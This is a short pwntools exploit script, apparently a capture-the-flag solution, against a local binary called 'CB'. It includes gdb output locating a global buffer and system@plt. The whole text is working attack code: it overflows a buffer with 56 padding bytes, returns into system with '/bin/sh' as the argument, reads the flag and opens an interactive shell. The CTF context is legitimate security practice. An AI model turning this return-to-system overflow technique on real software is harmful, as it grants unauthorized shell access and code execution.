from pwn import *

context.log_level='debug'
libc = ELF('/lib32/libc.so.6')
s = process('./CB')


'''
gdb-peda$ p &name
$1 = (<data variable, no debug info> *) 0x804a060 <name>
gdb-peda$ p system
$2 = {<text variable, no debug info>} 0x8048410 <system@plt>
'''

name = 0x804a060
system = 0x8048410

s.recvuntil('whats your name?: ')
s.sendline('/bin/sh\x00')
s.recvuntil('?')
s.sendline('238')
s.sendline('44')
s.send('A'*56+p32(system)+p32(name)*2)

s.sendline("echo 1;cat flag")
s.recvuntil("1\n")
print "flag: "+s.recv(1024)
s.interactive()